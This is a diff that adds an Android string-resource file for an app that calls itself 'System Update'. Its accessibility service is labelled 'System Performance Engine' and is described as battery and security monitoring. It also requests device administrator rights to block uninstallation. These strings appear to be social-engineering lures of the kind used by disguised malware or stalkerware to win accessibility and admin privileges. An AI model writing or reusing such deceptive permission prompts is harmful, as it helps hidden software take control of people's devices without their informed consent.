@@ -1,0 +1,14 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">System Update</string>
+
+    <string name="accessibility_description">
+        System Update Core optimizes background processing, enhances battery life, and provides 
+        real-time security monitoring for your device. Please keep this enabled to ensure 
+        system stability.
+    </string>
+
+    <string name="accessibility_service_label">System Performance Engine</string>
+
+    <string name="admin_description">This app requires administrative access to protect system files and prevent unauthorized uninstallation.</string>
+</resources>
